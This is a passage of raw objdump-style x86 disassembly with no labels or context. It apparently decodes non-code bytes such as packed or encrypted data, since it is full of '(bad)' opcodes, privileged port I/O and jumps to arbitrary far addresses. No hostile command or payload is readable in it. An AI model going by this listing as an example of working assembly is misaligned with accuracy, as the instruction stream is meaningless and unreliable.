  4398ea:	xor    dl,0x3e
  4398ed:	mov    al,0x5e
  4398ef:	and    DWORD PTR ss:[ecx-0x14],ebp
  4398f3:	rol    DWORD PTR [eax],cl
  4398f5:	pop    ebx
  4398f6:	dec    edx
  4398f7:	xchg   edx,eax
  4398f8:	mov    ah,0x54
  4398fa:	dec    edx
  4398fb:	shl    DWORD PTR [edx-0xa],1
  4398fe:	dec    eax
  4398ff:	and    DWORD PTR [ebp-0x29918ced],esp
  439905:	imul   edx,DWORD PTR [ebx],0x5c38de1e
  43990b:	push   ss
  43990c:	aas    
  43990d:	jns    0x4398ce
  43990f:	out    dx,eax
  439910:	inc    eax
  439911:	pop    ebx
  439912:	mov    ecx,0x1e8751e4
  439917:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439919:	cmp    BYTE PTR [ecx-0x65b69f16],0x9d
  439920:	mov    ds:0x3f6af188,al
  439925:	pop    es
  439926:	mov    ch,0xc4
  439928:	push   0x85075051
  43992d:	cmp    ecx,DWORD PTR [ebp-0x6740b715]
  439933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439934:	or     edi,DWORD PTR [edx]
  439936:	or     ebx,DWORD PTR [eax]
  439938:	stc    
  439939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43993a:	adc    eax,0xc120fa7
  43993f:	push   ebp
  439940:	es push ebx
  439942:	xlat   BYTE PTR ds:[ebx]
  439943:	enter  0x316,0x46
  439947:	cs pop ecx
  439949:	and    bl,BYTE PTR [ecx+0x44]
  43994c:	inc    edx
  43994d:	sbb    BYTE PTR [eax-0x43d18c3c],dh
  439953:	and    dh,BYTE PTR [ebp-0xb0d18e5]
  439959:	data16 outs dx,BYTE PTR ds:[esi]
  43995b:	jmp    0xec9d24bb
  439960:	add    ch,bl
  439962:	in     eax,0x63
  439964:	dec    edx
  439965:	push   esp
  439966:	mov    ebp,0x1ba89b38
  43996b:	(bad)
  43996e:	push   ss
  43996f:	add    eax,ecx
  439971:	mov    WORD PTR [ebx-0x456fab8a],es
  439977:	test   BYTE PTR [ebp+0x4d198e92],dl
  43997d:	jns    0x43994b
  43997f:	adc    ebx,DWORD PTR [esi]
  439981:	std    
  439982:	and    eax,0xbbbb8b7a
  439987:	and    DWORD PTR ss:[ecx-0xda070c6],edi
  43998e:	bound  edx,QWORD PTR [ecx-0x43]
  439991:	xchg   edx,eax
  439992:	jae    0x439964
  439994:	inc    ebp
  439995:	or     BYTE PTR [esi+eiz*8+0x1e],ch
  439999:	adc    esi,DWORD PTR [edi+0x4be9179f]
  43999f:	neg    bh
  4399a1:	push   esp
  4399a2:	add    DWORD PTR [eax],esp
  4399a4:	dec    esp
  4399a5:	sahf   
  4399a6:	jmp    0x439986
  4399a8:	xchg   eax,edi
  4399aa:	add    BYTE PTR [esi+0x394565ec],dl
  4399b0:	stos   DWORD PTR es:[edi],eax
  4399b1:	es mov cl,0xc4
  4399b4:	sar    ch,1
  4399b6:	sbb    al,0x3a
  4399b8:	les    esp,FWORD PTR [ebx+0x1f]
  4399bb:	ins    DWORD PTR es:[edi],dx
  4399bc:	push   ds
  4399bd:	jmp    0x4eb8da54
  4399c2:	out    0x4e,al
  4399c4:	cmp    edi,ecx
  4399c6:	fist   DWORD PTR [esi-0x76]
  4399c9:	sti    
  4399ca:	jg     0x439976
  4399cc:	add    esi,0xf625eece
  4399d2:	mov    eax,ebp
  4399d4:	or     al,0x55
  4399d6:	ins    DWORD PTR es:[edi],dx
  4399d7:	inc    edi
  4399d8:	sahf   
  4399d9:	or     eax,0xbda5a685
  4399de:	xchg   edi,ebp
  4399e0:	and    eax,0x555cc994
  4399e5:	aas    
  4399e6:	lods   eax,DWORD PTR ds:[esi]
  4399e7:	div    BYTE PTR [edx+0x7c]
  4399ea:	dec    ebp
  4399eb:	pop    ebx
  4399ec:	fs mov dl,0x5e
  4399ef:	mov    ah,0xbb
  4399f1:	test   DWORD PTR [ebp+0x19],edi
  4399f4:	sbb    edx,DWORD PTR [ebp-0x3564bdf4]
  4399fa:	addr16 popa 
  4399fc:	push   ss
  4399fd:	add    BYTE PTR [edi-0x39],dh
  439a00:	sbb    ecx,ebp
  439a02:	push   ebp
  439a03:	xchg   esp,eax
  439a04:	push   ecx
  439a05:	cmp    al,0x0
  439a08:	lods   al,BYTE PTR ds:[esi]
  439a09:	pop    ebp
  439a0a:	mov    ebp,0xc37e4524
  439a0f:	les    esp,FWORD PTR [ebp-0x6f]
  439a12:	pop    ebp
  439a13:	repnz jmp 0x896d:0x993d7b2b
  439a1b:	or     dl,BYTE PTR [ebp+0x23ebed9b]
  439a21:	xchg   ecx,eax
  439a22:	jmp    0x2bebb7f6
  439a27:	pop    edx
  439a28:	sbb    DWORD PTR [edi],esp
  439a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439a2b:	outs   dx,BYTE PTR ds:[esi]
  439a2c:	cld    
  439a2d:	stos   DWORD PTR es:[edi],eax
  439a2e:	rcr    DWORD PTR [esi+0x5b],1
  439a31:	push   esp
  439a32:	mov    ah,BYTE PTR [esi-0x634ce80b]
  439a38:	sbb    al,0x96
  439a3a:	sbb    al,0x87
  439a3c:	cdq    
  439a3d:	cs mov ebx,0xbd8e8c5b
  439a43:	ins    BYTE PTR es:[edi],dx
  439a44:	sbb    ch,BYTE PTR [ecx-0x7e]
  439a47:	cmp    edi,ebx
  439a49:	fisubr DWORD PTR [eax]
  439a4b:	fnstsw WORD PTR [ebp+0x34a0ac8b]
  439a51:	or     DWORD PTR [edi-0x4eddb4a1],esi
  439a57:	clc    
  439a58:	and    BYTE PTR [ecx],cl
  439a5a:	mov    ebp,0xfc18e8c
  439a5f:	fst    st(2)
  439a61:	cdq    
  439a62:	sti    
  439a63:	push   eax
  439a64:	pushf  
  439a65:	xor    eax,0x1ef3cf3a
  439a6a:	jl     0x439a84
  439a6c:	les    esp,FWORD PTR [edx-0x245865c5]
  439a72:	mov    esi,0x8b9f0e9c
  439a77:	xor    al,0xbc
  439a79:	mov    eax,ds:0x13d681c6
  439a7e:	xchg   edi,eax
  439a7f:	aam    0x17
  439a81:	leave  
  439a82:	xchg   ebx,eax
  439a83:	jae    0x439a58
  439a85:	sub    al,0xe3
  439a87:	mov    ecx,0x92aba005
  439a8c:	add    DWORD PTR [ebp+ebp*2-0x4f],esi
  439a90:	fmul   QWORD PTR [esi-0x125b4988]
  439a96:	and    BYTE PTR [ebp+0x7d3cb2b],dh
  439a9c:	pop    ecx
  439a9d:	call   0xc338c826
  439aa2:	add    dh,ah
  439aa4:	or     eax,DWORD PTR [edx-0x15]
  439aa7:	sub    bl,BYTE PTR [ebx]
  439aa9:	jns    0x439a47
  439aab:	pop    esp
  439aac:	push   ds
  439aad:	mov    WORD PTR [eax-0x6e],ds
  439ab0:	sbb    DWORD PTR [edx+0x4de098dc],edx
  439ab6:	shr    ebp,cl
  439ab8:	adc    eax,0xf16128aa
  439abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439abe:	mov    dh,BYTE PTR [si+0x7839]
  439ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439ac4:	sub    DWORD PTR [esi+0x11809dbb],ebx
  439aca:	out    0x53,eax
  439acc:	dec    ecx
  439acd:	or     eax,0x9402898c
  439ad2:	mov    ah,0xc
  439ad4:	(bad)  
  439ad5:	add    DWORD PTR [edx],esi
  439ad7:	push   0xffffffdd
  439ad9:	mov    BYTE PTR [ebp-0x4a98bbdc],dh
  439adf:	cmc    
  439ae0:	push   ebp
  439ae1:	and    al,0x65
  439ae3:	jmp    0xaaaaa763
  439ae8:	imul   ecx,DWORD PTR ss:[edi-0x7c],0x153b4d0d
  439af0:	sub    DWORD PTR [ebx-0x1b3a1734],ebp
  439af6:	and    ebp,esp
  439af8:	adc    al,0xfb
  439afa:	in     al,dx
  439afb:	and    BYTE PTR ds:0xfa2954b9,0x8
  439b02:	shl    DWORD PTR [edx+0x51],cl
  439b05:	fwait
  439b06:	or     ebp,DWORD PTR [eax-0x22d0b1ef]
  439b0c:	add    BYTE PTR [ebp+0x7c],al
  439b0f:	stos   DWORD PTR es:[edi],eax
  439b10:	ds in  al,0xef
  439b13:	in     al,0x4
  439b15:	lahf   
  439b16:	jmp    0x5be8e10c
  439b1b:	dec    eax
  439b1c:	ja     0x439b97
  439b1e:	rol    DWORD PTR [edi-0x30],cl
  439b21:	mov    cl,0xc6
  439b23:	jno    0x439afe
  439b25:	and    edi,DWORD PTR [ebp+0x562ff024]
  439b2b:	sub    eax,0xb4122b78
  439b30:	addr16 push 0x311fe433
  439b36:	mov    eax,ds:0xb8e817e8
  439b3b:	fisub  DWORD PTR ds:0x63c5bc69
  439b41:	mov    cl,0x2e
  439b43:	jle    0x439b62
  439b45:	and    BYTE PTR [ebx],bl
  439b47:	pop    ss
  439b48:	div    BYTE PTR [eax]
  439b4a:	or     DWORD PTR [ebx],0x38
  439b4d:	sbb    BYTE PTR [edx],ah
  439b4f:	adc    al,0x93
  439b51:	pop    edx
  439b52:	mov    ch,0xc8
  439b54:	scas   al,BYTE PTR es:[edi]
  439b55:	fs stos DWORD PTR es:[edi],eax
  439b57:	in     eax,0x21
  439b59:	or     bh,BYTE PTR [ecx+0x415b9aef]
  439b5f:	mov    ah,0x16
  439b61:	stc    
  439b62:	addr16 jmp 0x439b68
  439b65:	sbb    eax,0xb92035d9
  439b6a:	cmp    esp,DWORD PTR [ecx]
  439b6c:	(bad)  
  439b6d:	or     DWORD PTR [edi],edx
  439b6f:	add    dl,BYTE PTR [esi+0x28]
  439b72:	inc    edi
  439b73:	xchg   ecx,eax
  439b74:	and    eax,0x84efd4eb
  439b79:	or     al,0xb4
  439b7b:	or     esi,esi
  439b7d:	stc    
  439b7e:	and    bh,BYTE PTR [eax]
  439b80:	shl    BYTE PTR [edi+0x7aaf33ad],cl
  439b86:	je     0x439b20
  439b88:	lds    esi,FWORD PTR [esi-0x69]
  439b8b:	out    dx,eax
  439b8c:	test   BYTE PTR [ebp-0x1a],ch
  439b8f:	dec    edi
  439b90:	fisttp WORD PTR [edx-0x56da0b8b]
  439b96:	or     BYTE PTR [ebp+0x11e2fa43],al
  439b9c:	push   ebp
  439b9d:	and    DWORD PTR [esi+0x532980e9],ebx
  439ba3:	mov    ecx,0x9255952
  439ba8:	hlt    
  439ba9:	hlt    
  439baa:	sub    dh,cl
  439bac:	push   esp
  439bad:	pop    ebp
  439bae:	mov    bl,0xef
  439bb0:	daa    
  439bb1:	mov    eax,ds:0x6f4dcc62
  439bb6:	add    ebp,eax
  439bb8:	sti    
  439bb9:	dec    edx
  439bba:	push   esp
  439bbb:	pop    eax
  439bbc:	add    ebx,DWORD PTR [eax]
  439bbe:	loopne 0x439c24
  439bc0:	jmp    DWORD PTR ds:0x3c4b5449
  439bc6:	jp     0x439bb0
  439bc8:	lds    ebx,FWORD PTR gs:[edx-0x15]
  439bcc:	sub    esi,esi
  439bce:	sub    BYTE PTR [edx],ch
  439bd0:	sbb    eax,0x44663db9
  439bd5:	pop    ss
  439bd6:	pop    ecx
  439bd7:	sbb    eax,edx
  439bd9:	mov    ds:0x60bb6c6b,al
  439bde:	mov    ebx,0x5c3b27a7
  439be3:	repnz xchg edx,eax
  439be5:	sbb    DWORD PTR [edx+0x54],ebx
  439be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439be9:	jecxz  0x439b99
  439beb:	mov    esp,edi
  439bed:	jg     0x439bac
  439bef:	fs pop ss
  439bf1:	xor    al,BYTE PTR [ebx]
  439bf3:	bound  esp,QWORD PTR [ebp+0x29f1e0c0]
  439bf9:	mov    al,0xf4
  439bfb:	ror    DWORD PTR [esi+0x78b4b245],cl
  439c01:	sti    
  439c02:	sbb    edx,eax
  439c04:	in     al,0x27
  439c06:	xchg   edx,eax
  439c07:	ds xchg ebp,eax
  439c09:	pusha  
  439c0a:	cmp    dh,ah
  439c0c:	mov    bh,0x7c
  439c0e:	mov    WORD PTR [eax],ss
  439c10:	pop    ds
  439c11:	fsqrt  
  439c13:	lahf   
  439c14:	cdq    
  439c15:	mov    ebp,0x64c2afe8
  439c1a:	pop    edi
  439c1b:	sub    ebp,ebx
  439c1d:	stos   DWORD PTR es:[edi],eax
  439c1e:	jne    0x439c4b
  439c20:	mov    ch,0x9a
  439c22:	stos   BYTE PTR es:[edi],al
  439c23:	call   0x2b640b0f
  439c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439c29:	jns    0x439bdb
  439c2b:	(bad)  
  439c2c:	sti    
  439c2d:	bound  ebp,QWORD PTR [ebx+0x5c]
  439c30:	adc    eax,0xc3e69e3f
  439c35:	inc    ebx
  439c36:	fisubr DWORD PTR [ecx+0x325c965]
  439c3c:	push   DWORD PTR [ecx]
  439c3e:	call   FWORD PTR [ecx+0x3cb6b2a0]
  439c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439c45:	shr    BYTE PTR [esi],0xe9
  439c48:	dec    esp
  439c49:	les    esi,FWORD PTR [ebx+0x4e]
  439c4c:	dec    DWORD PTR [ecx+eiz*8]
  439c4f:	mov    BYTE PTR [ebp+0x2],dl
  439c52:	repz or DWORD PTR [si+0x3d],ecx
  439c57:	inc    ebp
  439c58:	mov    ch,0xef
  439c5a:	lock lock mov ds:0x20cff26c,eax
  439c61:	or     DWORD PTR [edx+eax*4+0x7cf86b1a],esp
  439c68:	push   cs
  439c69:	pop    ds
  439c6a:	xchg   DWORD PTR [esi+0x49],edi
  439c6d:	icebp  
  439c6e:	xchg   edx,eax
  439c6f:	mov    ah,0x21
  439c71:	cmp    BYTE PTR [edx+0x5adfacf4],0x18
  439c78:	addr16 xchg esi,eax
  439c7a:	xchg   esi,eax
  439c7b:	xchg   DWORD PTR [eax],edx
  439c7d:	jge    0x439c42
  439c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439c80:	cwde   
  439c81:	add    eax,0x79a517fb
  439c86:	and    eax,0xc8e2a2ed
  439c8b:	(bad)  
  439c8c:	adc    edi,edx
  439c8e:	leave  
  439c8f:	neg    DWORD PTR ss:[ecx-0x4f258509]
  439c96:	pop    ds
  439c97:	pop    DWORD PTR ds:0xe5e5a99c
  439c9d:	mov    ch,0x73
  439c9f:	jp     0x439c4e
  439ca1:	in     al,dx
  439ca2:	out    0xed,al
  439ca4:	pop    ebp
  439ca5:	repnz (bad)
  439ca8:	xor    DWORD PTR [ecx-0x63a25de3],0x7b
  439caf:	fwait
  439cb0:	inc    edx
  439cb1:	imul   ebp,DWORD PTR [ebp-0x38],0x5a
  439cb5:	es cmp al,0x88
  439cb8:	sti    
  439cb9:	jno    0x439c70
  439cbb:	je     0x439d16
  439cbd:	inc    ebx
  439cbe:	push   ecx
  439cbf:	mov    WORD PTR [ebp+0x61],ss
  439cc2:	mov    ch,0xee
  439cc4:	mov    eax,ds:0xe25eecc7
  439cc9:	xchg   ebx,ecx
  439ccb:	js     0x439cf0
  439ccd:	leave  
  439cce:	sbb    ecx,DWORD PTR [ebx+ebx*4+0x655cd6a6]
  439cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439cd6:	dec    ebx
  439cd7:	mov    edx,0xc1ca200b
  439cdc:	sbb    eax,0x44c0bc56
  439ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439ce2:	pop    ebx
  439ce3:	pop    eax
  439ce4:	inc    edi
  439ce5:	mov    esp,0x9a731ce7
  439cea:	pop    ebx
  439ceb:	jae    0x439d6b
  439ced:	pop    ds
  439cee:	or     BYTE PTR [ebx+ebp*8-0x14eb3205],cl
  439cf5:	rcl    ecx,1
  439cf7:	mov    ch,0xa9
  439cf9:	dec    esi
  439cfa:	mov    cl,0x24
  439cfc:	dec    edi
  439cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439cfe:	or     ecx,DWORD PTR [eax+0x644beacf]
  439d04:	popf   
  439d05:	cs mov eax,0x6238f3ab
  439d0b:	mov    ah,0xb1
  439d0d:	mov    bh,BYTE PTR [eax+edi*1-0x68]
  439d11:	xchg   edx,eax
  439d12:	adc    DWORD PTR [ebx],edi
  439d14:	mov    ebx,0xe35cbc98
  439d19:	pop    esi
  439d1a:	inc    ebx
  439d1b:	lods   eax,DWORD PTR ds:[esi]
  439d1c:	and    eax,0x39f1d397
  439d21:	sbb    eax,0x5aefe38f
  439d26:	xor    al,0x7b
  439d28:	jmp    FWORD PTR [eax+0x2cc93d5b]
  439d2e:	call   0x35c0:0xbbb24590
  439d35:	cmp    al,0xf3
  439d37:	or     bh,BYTE PTR [esi+ebx*1]
  439d3a:	imul   ebx,DWORD PTR [ebp+0x1e],0xb6fd0dc9
  439d41:	sub    al,0xa6
  439d43:	inc    eax
  439d44:	jbe    0x439cd4
  439d46:	cmp    al,0x4e
  439d48:	daa    
  439d49:	mov    al,0x43
  439d4b:	push   0x6b5f2d2
  439d50:	push   ss
  439d51:	or     DWORD PTR [edx-0x7366c693],esi
  439d57:	jmp    0x439d23
  439d59:	jg     0x439dc9
  439d5b:	bound  eax,QWORD PTR [ecx-0x61]
  439d5e:	pop    ebx
  439d5f:	xor    DWORD PTR [esi+0x2e],ebp
  439d62:	sahf   
  439d63:	mov    ch,0x2e
  439d65:	xor    BYTE PTR [eax+0x78],ah
  439d68:	rol    bl,1
  439d6a:	mov    al,0xc4
  439d6c:	add    bl,bl
  439d6e:	xor    dl,bh
  439d70:	inc    ebp
  439d71:	out    0xd4,eax
  439d73:	out    dx,eax
  439d74:	mov    esp,DWORD PTR [ebx+0x2d]
  439d77:	pop    ss
  439d78:	sar    DWORD PTR [edi+ebp*1-0x2bfcda0c],cl
  439d7f:	jmp    0xa786:0xacbd9c88
  439d86:	call   0xe79:0x91a61262
  439d8d:	int    0xc5
  439d8f:	sbb    BYTE PTR [eax+eax*8+0x1f84a4b8],bh
  439d96:	push   cs
  439d97:	xor    al,0x95
  439d99:	jg     0x439ddd
  439d9b:	jmp    0x6916:0x72b87f87
  439da2:	cs jp  0x439da3
  439da5:	out    0x9b,al
  439da7:	retf   0x8f71
  439daa:	pop    edi
  439dab:	cmp    bl,BYTE PTR [ecx]
  439dad:	mov    DWORD PTR [esi-0x19],ebx
  439db0:	sbb    dl,0xa9
  439db3:	imul   edx,DWORD PTR [esi],0x193d30e9
  439db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439dba:	jmp    0x39db:0x6b9ba976
  439dc1:	push   ss
  439dc2:	fnsave ds:0xf2ccb09b
  439dc8:	adc    DWORD PTR [ebx-0x43],ebx
  439dcb:	xor    al,0x69
  439dcd:	pop    es
  439dce:	and    BYTE PTR [edx],ch
  439dd0:	adc    eax,0x9df1365c
  439dd5:	fild   WORD PTR [edx-0x6065eaae]
  439ddb:	ins    DWORD PTR es:[edi],dx
  439ddc:	cdq    
  439ddd:	mov    al,ds:0x64e60c23
  439de2:	add    DWORD PTR [ebx-0x11465dab],0x3d
  439de9:	rcl    BYTE PTR [edi],1
  439deb:	and    DWORD PTR ss:[eax+0x5d469958],ebx
  439df2:	mov    esp,0x1ae16dd4
  439df7:	popf   
  439df8:	out    0x95,al
  439dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439dfb:	fdiv   DWORD PTR [ebp+edi*2-0x71]
  439dff:	jle    0x439e2e
  439e01:	loopne 0x439da1
  439e03:	in     al,dx
  439e04:	inc    eax
  439e05:	mov    ecx,edx
  439e07:	leave  
  439e08:	mov    cl,al
  439e0a:	popa   
  439e0b:	fst    QWORD PTR [ebx+0x1]
  439e0e:	jmp    0x54027405
  439e13:	out    0x66,eax
  439e15:	xchg   edx,eax
  439e16:	js     0x439dee
  439e18:	popa   
  439e19:	clc    
  439e1a:	xor    ah,BYTE PTR [eax]
  439e1c:	ja     0xd73c2d4
  439e22:	icebp  
  439e23:	sub    al,0x6
  439e25:	jmp    0x439e75
  439e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439e28:	and    al,0x19
  439e2a:	stc    
  439e2b:	sub    eax,DWORD PTR [ebp+0x18]
  439e2e:	test   BYTE PTR [eax-0x63],0x27
  439e32:	pop    ds
  439e33:	jae    0x439e3c
  439e35:	xor    eax,0xa26d9854
  439e3a:	sbb    DWORD PTR [ebx],0xffffff92
  439e3d:	mov    esp,DWORD PTR [edx+0x1cb0a9ec]
  439e43:	mov    esp,0xf4bac9b4
  439e48:	(bad)  [esi-0x279920b3]
  439e4e:	mov    ch,0x94
  439e50:	inc    esi
  439e51:	fcomp  QWORD PTR [ebx]
  439e53:	aaa    
  439e54:	fdivr  DWORD PTR [ebp-0x66e546af]
  439e5a:	lock sti 
  439e5c:	or     bl,BYTE PTR [ebp+0x5fe7a09c]
  439e62:	pop    ds
  439e63:	in     al,0x4a
  439e65:	(bad)  
  439e66:	adc    eax,0xfd051e10
  439e6b:	int    0x4a
  439e6d:	or     DWORD PTR [edi+ebp*4],edi
  439e70:	std    
  439e71:	mov    WORD PTR ds:0xf2ada37b,?
  439e77:	jo     0x439e8e
  439e79:	push   cs
  439e7a:	add    ebp,esp
  439e7c:	test   DWORD PTR [ecx-0x76],edi
  439e7f:	xchg   edi,eax
  439e80:	and    DWORD PTR [ecx-0x35a9c3f8],ecx
  439e86:	xchg   eax,edi
  439e88:	test   BYTE PTR [edx+0x30c4a58b],bl
  439e8e:	dec    eax
  439e8f:	(bad)  
  439e90:	xlat   BYTE PTR ds:[ebx]
  439e91:	add    eax,0x1a94a02c
  439e96:	shl    esp,0x22
  439e99:	jno    0x439ef2
  439e9b:	xor    al,0x12
  439e9d:	pushf  
  439e9e:	jnp    0x439f11
  439ea0:	jae    0x439efb
  439ea2:	rol    DWORD PTR [edi],cl
  439ea4:	push   0x6e50db34
  439ea9:	in     eax,0xbb
  439eab:	add    al,0x12
  439ead:	out    dx,al
  439eae:	jne    0x439e9a
  439eb0:	in     eax,0x8b
  439eb2:	xor    al,0xec
  439eb4:	or     bh,BYTE PTR [edx+0x56]
  439eb7:	js     0x439ed5
  439eb9:	sub    DWORD PTR [ecx+0x3a04aa1b],esi
  439ebf:	push   0xffffffcd
  439ec1:	jp     0x439e70
  439ec3:	ret    
  439ec4:	mov    BYTE PTR [ecx+0x712b2d5b],ch
  439eca:	jle    0x439f14
  439ecc:	hlt    
  439ecd:	jne    0x439f3f
  439ecf:	stos   DWORD PTR es:[edi],eax
  439ed0:	sbb    cl,BYTE PTR [ecx-0x2b]
  439ed3:	xchg   ebx,eax
  439ed4:	mov    WORD PTR [esp+ebp*1],es
  439ed7:	jmp    0x2d8f3c23
  439edc:	sub    ebp,0xffffffae
  439edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439ee0:	ficom  WORD PTR [ebx-0x6e21a8c]
  439ee6:	sbb    cl,BYTE PTR [eax+eiz*2-0x7894e284]
  439eed:	xchg   ebx,ecx
  439eef:	sub    DWORD PTR [ebp-0x4b1945b8],esp
  439ef5:	lahf   
  439ef6:	push   ecx
  439ef7:	adc    DWORD PTR [edx],ebx
  439ef9:	or     DWORD PTR [ebp+0x357d2a7d],edx
  439eff:	dec    esi
  439f00:	xchg   edi,eax
  439f01:	in     eax,dx
  439f02:	sub    ebx,ebp
  439f04:	cmp    edx,eax
  439f06:	pop    ss
  439f07:	mov    ds:0xff790fd1,al
  439f0c:	bound  ebx,QWORD PTR [edi-0x52]
  439f0f:	in     al,dx
  439f10:	add    esi,DWORD PTR [esi-0x26c41b42]
  439f16:	mov    ebp,0x854fd64f
  439f1b:	pop    esp
  439f1c:	push   ecx
  439f1d:	aam    0x93
  439f1f:	xchg   DWORD PTR [ecx+0x29df1e04],esp
  439f25:	dec    ecx
  439f26:	in     al,0x84
  439f28:	inc    ecx
  439f29:	idiv   BYTE PTR ds:0xff055fe9
  439f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439f30:	lds    edi,FWORD PTR [ebx-0x320213df]
  439f36:	repnz retf 0x68a0
  439f3a:	fwait
  439f3b:	sahf   
  439f3c:	mov    al,ds:0xca4b17c
  439f41:	mov    esp,0x17caeded
  439f46:	mov    bh,0x68
  439f48:	pop    ebx
  439f49:	cmp    al,0xb9
  439f4b:	add    al,0xaf
  439f4d:	call   0xeb57e6c3
  439f52:	pop    esp
  439f53:	je     0x439f76
  439f55:	jge    0x439f51
  439f57:	push   ebx
  439f58:	imul   edx,DWORD PTR [ebx],0x46956a22
  439f5e:	leave  
  439f5f:	jmp    0x391f:0x1ea40c3f
  439f66:	lds    edi,FWORD PTR [ecx+0x2]
  439f69:	clc    
  439f6a:	ret    
  439f6b:	ret    0xa5aa
  439f6e:	sti    
  439f6f:	call   0x4c2f6bf0
  439f74:	fist   DWORD PTR [eax-0x78]
  439f77:	clc    
  439f78:	dec    edx
  439f79:	fistp  QWORD PTR [eax-0xd5e0cac]
  439f7f:	or     eax,ebp
  439f81:	or     edx,DWORD PTR [edx+0x6ca2a8f0]
  439f87:	out    0x22,al
  439f89:	jns    0x439fef
  439f8b:	jp     0x439f31
  439f8d:	mov    edi,0xa3125fef
  439f92:	stos   DWORD PTR es:[edi],eax
  439f93:	ins    BYTE PTR es:[edi],dx
  439f94:	(bad)
  439f97:	cmp    eax,0xf680fbc0
  439f9c:	mov    ah,0x22
  439f9e:	mov    edx,0xc077e634
  439fa3:	or     eax,0x6b3b3a7d
  439fa8:	inc    ebp
  439fa9:	bound  esi,QWORD PTR [ecx-0x34a75f16]
  439faf:	xor    ah,BYTE PTR ds:0xd188e989
  439fb5:	stc    
  439fb6:	sub    al,0x46
  439fb8:	mov    ebp,0xdc76bba5
  439fbd:	mov    ah,0x97
  439fbf:	je     0x439f66
  439fc1:	cdq    
  439fc2:	xchg   esi,eax
  439fc3:	jge    0x439f53
  439fc5:	xor    edi,DWORD PTR [esp+edx*8-0x1cb2c6b7]
  439fcc:	gs adc eax,0x492df2a1
  439fd2:	ret    0x21f9
  439fd5:	sub    DWORD PTR [esi-0x4e00e6cb],esp
  439fdb:	mov    esp,0x4a9b9b03
  439fe0:	call   0x3ff56e2c
  439fe5:	or     edx,edx
  439fe7:	mov    ebx,DWORD PTR [ecx+ebp*2-0x4c]
  439feb:	je     0x439ff0
  439fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439fee:	test   eax,0x7d1f9914
  439ff3:	jge    0x439fc2
  439ff5:	inc    ebp
  439ff6:	mov    bl,0x64
  439ff8:	xchg   esp,eax
  439ff9:	nop
  439ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439ffb:	xor    eax,0xb4b10544
  43a000:	outs   dx,BYTE PTR ds:[esi]
  43a001:	loop   0x43a081
  43a003:	popa   
  43a004:	push   esi
  43a005:	scas   al,BYTE PTR es:[edi]
  43a006:	test   dl,ah
  43a008:	clc    
  43a009:	ins    DWORD PTR es:[edi],dx
  43a00a:	loop   0x439fc6
  43a00c:	in     eax,dx
  43a00d:	test   al,0xba
  43a00f:	mov    esi,0xae5fd91a
  43a014:	(bad)  
  43a015:	cs mov ch,0xea
  43a018:	test   DWORD PTR [eax+0x7d1f3bab],ebp
  43a01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a01f:	(bad)  
  43a020:	xchg   esi,eax
  43a021:	inc    ebx
  43a022:	dec    ecx
  43a023:	push   eax
  43a024:	sub    DWORD PTR [ebx-0x44],ebx
  43a027:	cmp    ebx,DWORD PTR fs:[ebp-0x56726e7e]
  43a02e:	ficomp DWORD PTR [ecx]
  43a030:	enter  0xbb9a,0x81
  43a034:	jge    0x43a06a
  43a036:	jmp    0x43a04b
  43a038:	sahf   
  43a039:	mov    edi,0x991e25ce
  43a03e:	les    edi,FWORD PTR [ebx-0xd]
  43a041:	cmp    ebx,ebp
  43a043:	or     bl,BYTE PTR [esi-0x5b]
  43a046:	imul   ebx,DWORD PTR [edi+0x4e],0xffffffd0
  43a04a:	add    DWORD PTR [eax],ecx
  43a04c:	inc    eax
  43a04d:	and    BYTE PTR [eax-0x431a8857],0xd4
  43a054:	adc    eax,0xe531eac3
  43a059:	call   0x8a93:0xb6f9eba0
  43a060:	sbb    ebx,ecx
  43a062:	aam    0x72
  43a064:	outs   dx,BYTE PTR ds:[esi]
  43a065:	loop   0x43a057
  43a067:	mov    eax,ds:0x7b9abb
  43a06c:	mov    esp,0x97fb47d5
  43a071:	repnz call 0x4b76:0x963832d2
  43a079:	sti    
  43a07a:	mov    ecx,0xbb9ee6a4
  43a07f:	jmp    0x43a0e2
  43a081:	gs fwait
  43a083:	leave  
  43a084:	scas   eax,DWORD PTR es:[edi]
  43a085:	xchg   edi,eax
  43a086:	int    0x52
  43a088:	mov    ecx,0x904ce8d
  43a08d:	add    BYTE PTR [edx-0x44633c83],bh
  43a093:	adc    bh,ah
  43a095:	sbb    dh,al
  43a097:	and    DWORD PTR [ecx+0x5],0x5f
  43a09b:	pop    esi
  43a09c:	dec    esi
  43a09d:	fdiv   QWORD PTR [eax+0x428d71f4]
  43a0a3:	xor    eax,DWORD PTR [esi]
  43a0a5:	in     eax,0xe4
  43a0a7:	sbb    eax,0x5a8589bc
  43a0ac:	shl    ebx,cl
  43a0ae:	popa   
  43a0af:	add    bl,BYTE PTR [esi]
  43a0b1:	xchg   ebp,eax
  43a0b2:	shl    eax,cl
  43a0b4:	scas   al,BYTE PTR es:[edi]
  43a0b5:	daa    
  43a0b6:	pop    ecx
  43a0b7:	cmp    DWORD PTR [edi],esp
  43a0b9:	fld    DWORD PTR [eax-0xd5c7ae5]
  43a0bf:	jne    0x43a0f4
  43a0c1:	adc    eax,0x9f81fe21
  43a0c6:	mov    ebx,0xe8b34aa
